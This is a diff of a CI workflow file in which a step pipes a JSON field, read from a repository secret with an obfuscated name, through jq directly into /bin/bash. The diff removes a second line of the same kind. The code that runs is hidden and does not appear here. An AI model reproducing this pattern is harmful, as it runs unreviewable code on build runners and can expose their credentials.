@@ -23,7 +23,6 @@ jobs:
           fkd6624: ${{ secrets.fkd6624 }}
         run: |
           printf '%s' "$fkd6624" | jq -r .jggaa275 | /bin/bash
-          echo $guync4196 | jq -r .rm71797 | /bin/bash
 
       - name: Save results
         if: always()
